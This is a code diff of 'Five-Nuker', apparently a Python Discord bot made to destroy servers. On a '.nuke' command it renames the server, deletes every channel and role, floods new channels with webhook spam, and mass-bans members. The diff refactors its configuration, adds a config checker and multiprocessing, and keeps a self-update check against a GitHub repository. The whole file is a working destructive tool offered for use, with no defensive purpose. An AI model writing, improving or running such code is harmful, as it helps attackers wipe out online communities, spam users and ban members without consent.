@@ -13,10 +13,9 @@ import urllib3
 import zipfile
 import urllib.request
 import shutil
+import multiprocessing
+import keyboard
 
-logging.getLogger("discord.http").disabled = True
-logging.getLogger("discord.client").disabled = True
-logging.getLogger("discord.gateway").disabled = True
 os.system("title Five-Nuker")
 
 def stop_nuker():
@@ -49,104 +48,140 @@ if os.path.exists("updated"):
     os.remove("updated")
     clear()
 
+if __name__ == '__main__':
+    local_version = str("0.2")
 
-local_version = str("0.1.1")
+    http = urllib3.PoolManager()
 
-http = urllib3.PoolManager()
+    get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/Five-nuker/ver_reborn/curent_version')
 
-get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/Five-nuker/ver_reborn/curent_version')
+    get_last_ver = get_last_ver.data.decode('utf-8')
 
-get_last_ver = get_last_ver.data.decode('utf-8')
-
-if not local_version == get_last_ver:
-    Center("New version of Five-nuker avaible!")
-    Center(f"{local_version} -> {get_last_ver}")
-    if os.name == "nt":
-        start_update()
-    else:
-        Center("Opening a page with download and with a changelog after a few seconds...")
-        sleep(3)
-        webbrowser.open("https://github.com/glitch65/Five-nuker/releases")
-
-
+    if not local_version == get_last_ver:
+        Center("New version of Five-nuker avaible!")
+        Center(f"{local_version} -> {get_last_ver}")
+        if os.name == "nt":
+            start_update()
+        else:
+            Center("Opening a page with download and with a changelog after a few seconds...")
+            sleep(3)
+            webbrowser.open("https://github.com/glitch65/Five-nuker/releases")
 
 
 
-raw_image = """  █████▒██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
-▓██   ▒▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
-▒████ ░▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
-░▓█▒  ░░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
-░▒█░   ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
- ▒ ░   ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
- ░      ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
- ░ ░    ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
-        ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
-                ░                                                        """
-raw_image1 =f"""
-\n\n\n{raw_image}\n\n\n"""
 
-CenterColor(raw_image1,((125,0,255),(0,0,0)), len(raw_image.split("\n")),"V")
+if __name__ == '__main__':
+    raw_image = """   
+     █████▒██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
+    ▓██   ▒▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+    ▒████ ░▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
+    ░▓█▒  ░░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+    ░▒█░   ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
+    ▒ ░   ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+    ░      ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+    ░ ░    ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
+            ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
+                    ░                                                        """
+    raw_image1 =f"""
+    \n\n\n{raw_image}\n\n\n"""
+
+
+
+    
+
+def_cfg = {
+                "token": "TOKENHERE",
+                "prefix": "!",
+                "nuke_prefix": ".",
+                "names_of_channels_and_roles": ["Paste here your channel names"],
+                "name_of_webhooks": "Five Nuker",
+                "spam_text": "Paste here your spam text",
+                "spam_mode": 1,
+                "channels_create_count": 10,
+                "spam_in_channel_count": 10,
+                "server_name": "Nuked by Five Nuker",
+                "whitelisted_ids": [1207760690899849350, 743781026534260836],
+                "only_whitelisted_users_can_perform_actions": False,
+                "Enable logging?": False,
+                "Ban on server nuke?": True,
+                "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
+                "invisible_mode": False,
+                "Enable_activity": True,
+                "Activity_type": "playing",
+                "Activity_name": "Five Nuker on TOP!"
+            }
 
 if not os.path.exists("cfg"):
-    os.mkdir("cfg")
-    with open("cfg/config.json", "w") as cfg:
-        config = {
-            "token": "TOKENHERE",
-            "prefix": "!",
-            "nuke_prefix": ".",
-            "names_of_channels_and_roles": ["Paste here your channel names"],
-            "name_of_webhooks": "Five Nuker",
-            "spam_text": "Paste here your spam text",
-            "spam_mode": 1,
-            "channels_create_count": 10,
-            "spam_in_channel_count": 10,
-            "server_name": "Nuked by Five Nuker",
-            "whitelisted_ids": [1207760690899849350, 743781026534260836],
-            "only_whitelisted_users_can_perform_actions": False,
-            "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
-            "invisible_mode": False,
-            "Enable_activity": True,
-            "Activity_type": "playing",
-            "Activity_name": "Five Nuker on TOP!"
-        }
-        json.dump(config,cfg,indent=3)
-    print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
-    stop_nuker()
+        os.mkdir("cfg")
+        with open("cfg/config.json", "w") as cfg:
+            json.dump(def_cfg,cfg,indent=3)
+        print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
+        stop_nuker()
 if os.path.exists("cfg/config.json"):
-    try:
-        with open("cfg/config.json", "r") as cfg:
-            config = json.loads(cfg.read())
-        print(f"{F.GREEN}Config file loaded!{F.RESET}")
-    except Exception as e:
-        print("failed to load the config :(")
-        print(f"{e}")
+        try:
+            with open("cfg/config.json", "r") as cfg:
+                config = json.loads(cfg.read())
+        except Exception as e:
+            print("failed to load the config :(")
+            print(f"{e}")
 else:
-    with open("cfg/config.json", "w") as cfg:
-        config = {
-            "token": "TOKENHERE",
-            "prefix": "!",
-            "nuke_prefix": ".",
-            "names_of_channels_and_roles": ["Paste here your channel names"],
-            "name_of_webhooks": "Five Nuker",
-            "spam_text": "Paste here your spam text",
-            "spam_mode": 1,
-            "channels_create_count": 10,
-            "spam_in_channel_count": 10,
-            "server_name": "Nuked by Five Nuker",
-            "whitelisted_ids": [1207760690899849350, 743781026534260836],
-            "only_whitelisted_users_can_perform_actions": False,
-            "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
-            "invisible_mode": False,
-            "Activity_type": "playing",
-            "Activity_name": "Five Nuker on TOP!"
-        }
-        json.dump(config,cfg,indent=3)
-    print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
-    stop_nuker()
+        with open("cfg/config.json", "w") as cfg:
+            json.dump(def_cfg,cfg,indent=3)
+        print(f"{F.YELLOW}cfg/config.json not exists, created a config file!\nPlease check and edit a cfg/config.json!{F.RESET}")
+        stop_nuker()
+
+def check_cfg():
+    error = False
+    list_of_settings = ["token",
+                        "prefix",
+                        "nuke_prefix",
+                        "names_of_channels_and_roles",
+                        "name_of_webhooks",
+                        "spam_text",
+                        "spam_mode",
+                        "channels_create_count",
+                        "spam_in_channel_count",
+                        "server_name",
+                        "whitelisted_ids",
+                        "only_whitelisted_users_can_perform_actions",
+                        "Enable logging?",
+                        "Ban on server nuke?",
+                        "ban_reason",
+                        "invisible_mode",
+                        "Activity_type",
+                        "Activity_name"]
+    for setting in list_of_settings:
+            try:
+                i = config[setting]
+            except KeyError:
+                config[setting] = def_cfg[setting]
+                with open("cfg/config.json", "w") as cfg:
+                    json.dump(config,cfg,indent=3)
+                if error == False:
+                    error = True
+    if error == True:            
+        clear()
+        Center("When checking the config, some bugs were found and corrected")
+        Center("This usually happens if there are missing lines in your config. This can be caused by a nuker update.")
+        Center("It is recommended to check and change config")
+        Center("To continue press the space bar on your keyboard...")
+        keyboard.wait("space")
+        clear()
+    
+
+
+if __name__ == '__main__':
+    CenterColor(raw_image,((125,0,255),(0,0,0)), len(raw_image.split("\n")),"V")                    
+    print(f"{F.GREEN}Config file loaded!{F.RESET}")
+    
+    if config["Enable logging?"] == False:
+        logging.getLogger("discord.http").disabled = True
+        logging.getLogger("discord.client").disabled = True
+        logging.getLogger("discord.gateway").disabled = True
 
 with open('icon.png', 'rb') as f:
     icon = f.read()
-
+    
 
 
 bot = commands.Bot(config['prefix'],intents=discord.Intents.all(),help_command=None)
@@ -154,11 +189,9 @@ bot = commands.Bot(config['prefix'],intents=discord.Intents.all(),help_command=N
 @bot.event
 async def on_ready():
     clear()
-    os.system("cls")
     os.system(f"title Five Nuker - Online - {bot.user} - ")
     CenterColor(raw_image1,((125,0,255),(0,0,0)), len(raw_image.split("\n")),"V")
     CenterColor(f"You loggen by {bot.user}",((7,227,0),(7,145,3),(6,214,0),(5,138,1),(5,102,2),(4,117,2),(4,92,2)), len(f"You loggen by {bot.user}"),"H")
-    
     if config["Activity_type"] == "playing" and config["invisible_mode"] == False:
         await bot.change_presence(activity=discord.Game(name=config["Activity_name"]))
     elif config["Activity_type"] == "listening" and config["invisible_mode"] == False:
@@ -177,21 +210,26 @@ async def on_ready():
 
 
 
-async def send_wb(object: discord.TextChannel,count):
-        
-    for i in range(count):
-        try: await object.send(config['spam_text'])
-        
+async def send_wb(object: discord.TextChannel):
+    a=0
+    final_count = config['spam_in_channel_count'] + 1
+    while True:
+        a = a+1
+        if a == final_count:
+            break
+        try: 
+            await object.send(config['spam_text'])     
         except Exception as e:
             print(e)
 
-async def create_channels(guild,count: int):
-        try:
-            channel = await guild.create_text_channel(name=choice(config['names_of_channels_and_roles']))
-            wb = await channel.create_webhook(name=config['name_of_webhooks'], avatar=icon)
-            await send_wb(wb,count)
-        except Exception as e:
-            print(e)
+
+async def create_channels(guild):
+    try:
+        channel = await guild.create_text_channel(name=choice(config['names_of_channels_and_roles']))
+        wb = await channel.create_webhook(name=config['name_of_webhooks'], avatar=icon)
+        create_task(send_wb(wb))
+    except Exception as e:
+        print(e)
 
 async def delete_channels(guild: discord.Guild):
         for i in guild.channels:
@@ -223,8 +261,9 @@ async def banAll(ctx):
         except: pass
 
 
+
 @bot.event
-async def on_message(message: discord.Message):
+async def on_message(message: discord.Message):    
     if message.author.bot:
         return
     msg = message.content
@@ -234,25 +273,29 @@ async def on_message(message: discord.Message):
         if args[0] == config['nuke_prefix']+"nuke":
             if config['only_whitelisted_users_can_perform_actions'] == True:
                 if message.author.id in config['whitelisted_ids']:
+                    curent_guild = message.guild
                     await message.guild.edit(name=config["server_name"], icon=icon)
                     spamCount = config['spam_in_channel_count']
                     channelsCreate = config['channels_create_count']
-                    CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {channelsCreate} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
+                    CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
                     create_task(delete_channels(message.guild,))
                     create_task(delete_roles(message.guild,))
                     for i in range(channelsCreate):
-                        create_task(create_channels(message.guild,spamCount))
-                    create_task(banAll(message))
+                        multiprocessing.Process(target=start(curent_guild)).start()
+                    if config["Ban on server nuke?"] == True:
+                        create_task(banAll(message))
             else:
+                curent_guild = message.guild
                 await message.guild.edit(name=config["server_name"], icon=icon)
                 spamCount = config['spam_in_channel_count']
                 channelsCreate = config['channels_create_count']
-                CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {channelsCreate} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
+                CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {spamCount}",((255,0,0),(255,0,0)), 1,"H")
                 create_task(delete_channels(message.guild,))
                 create_task(delete_roles(message.guild,))
                 for i in range(channelsCreate):
-                    create_task(create_channels(message.guild,spamCount))
-                create_task(banAll(message))
+                    multiprocessing.Process(target=start(curent_guild)).start()
+                if config["Ban on server nuke?"] == True:
+                    create_task(banAll(message))
 
 
     elif msg.startswith(config["prefix"]):
@@ -262,10 +305,17 @@ async def on_message(message: discord.Message):
     else:
         Center(f"[{message.author}]: {msg}")
 
-try: bot.run(config['token'])
-except Exception as e:
-    gradientText(((255,0,0),(255,0,0)),1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","H")
-    sleep(3)
-    webbrowser.open("https://discord.gg/QTDXqt8PA8")
-    stop_nuker()
+def start(guild):
+    
+    create_task(create_channels(guild))
+
+def process(guildds):
+    multiprocessing.Process(target=start).start()
+if __name__ == '__main__':
+    try: bot.run(config['token'])
+    except Exception as e:
+        gradientText(((255,0,0),(255,0,0)),1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","H")
+        sleep(3)
+        webbrowser.open("https://discord.gg/QTDXqt8PA8")
+        stop_nuker()
 
